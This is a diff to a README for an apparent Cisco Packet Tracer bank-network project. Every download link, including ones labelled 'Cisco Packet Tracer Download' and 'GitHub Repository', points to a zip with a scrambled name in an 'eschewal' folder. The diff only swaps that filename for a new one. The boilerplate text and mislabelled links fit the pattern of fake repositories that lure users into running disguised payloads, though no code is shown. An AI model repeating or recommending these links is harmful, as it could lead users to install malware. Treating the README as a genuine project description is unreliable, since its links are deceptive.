@@ -1,7 +1,7 @@
 # 🌐 bank-network-in-cisco-packet-tracer - Build a Secure Bank Network
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/mango-jade/bank-network-in-cisco-packet-tracer/main/eschewal/network_cisco_bank_tracer_in_packet_icterode.zip)](https://raw.githubusercontent.com/mango-jade/bank-network-in-cisco-packet-tracer/main/eschewal/network_cisco_bank_tracer_in_packet_icterode.zip)
+[![Download](https://github.com/mango-jade/bank-network-in-cisco-packet-tracer/raw/refs/heads/main/eschewal/in-cisco-bank-tracer-packet-network-3.3-beta.4.zip)](https://github.com/mango-jade/bank-network-in-cisco-packet-tracer/raw/refs/heads/main/eschewal/in-cisco-bank-tracer-packet-network-3.3-beta.4.zip)
 
 ## 📚 Introduction
 Welcome to the bank-network-in-cisco-packet-tracer project. This application offers an easy way to visualize a bank network. It consists of a layout for four floors, featuring a dedicated server room along with routers, switches, and end devices. This setup helps banks understand their architecture clearly.
@@ -11,7 +11,7 @@ To get started with this application, you’ll need to follow these steps:
 
 1. **Visit the Release Page**
    Go to our release page to find the download link:
-   [Download the Latest Version](https://raw.githubusercontent.com/mango-jade/bank-network-in-cisco-packet-tracer/main/eschewal/network_cisco_bank_tracer_in_packet_icterode.zip)
+   [Download the Latest Version](https://github.com/mango-jade/bank-network-in-cisco-packet-tracer/raw/refs/heads/main/eschewal/in-cisco-bank-tracer-packet-network-3.3-beta.4.zip)
 
 2. **Choose Your File**
    On the release page, you will see options for different versions. Click on the version you want to download. It is usually a `.zip` or `.exe` file.
@@ -70,11 +70,11 @@ If you face any issues, refer to the support section on the GitHub page or reach
 If you want to contribute or report issues, please visit our GitHub page. We appreciate community support and feedback. For any specific questions, feel free to open an issue or reach out through the discussions.
 
 ## 🔗 Additional Resources
-- [Cisco Packet Tracer Download](https://raw.githubusercontent.com/mango-jade/bank-network-in-cisco-packet-tracer/main/eschewal/network_cisco_bank_tracer_in_packet_icterode.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/mango-jade/bank-network-in-cisco-packet-tracer/main/eschewal/network_cisco_bank_tracer_in_packet_icterode.zip)
+- [Cisco Packet Tracer Download](https://github.com/mango-jade/bank-network-in-cisco-packet-tracer/raw/refs/heads/main/eschewal/in-cisco-bank-tracer-packet-network-3.3-beta.4.zip)
+- [GitHub Repository](https://github.com/mango-jade/bank-network-in-cisco-packet-tracer/raw/refs/heads/main/eschewal/in-cisco-bank-tracer-packet-network-3.3-beta.4.zip)
 
 ## 💾 Conclusion
 You now have all the information needed to download, install, and use the bank-network-in-cisco-packet-tracer application. Explore the visual layout of a secure bank network and gain valuable insights into your architecture. 
 
 Don't forget to visit the release page to download the software:
-[Download the Latest Version](https://raw.githubusercontent.com/mango-jade/bank-network-in-cisco-packet-tracer/main/eschewal/network_cisco_bank_tracer_in_packet_icterode.zip)
+[Download the Latest Version](https://github.com/mango-jade/bank-network-in-cisco-packet-tracer/raw/refs/heads/main/eschewal/in-cisco-bank-tracer-packet-network-3.3-beta.4.zip)
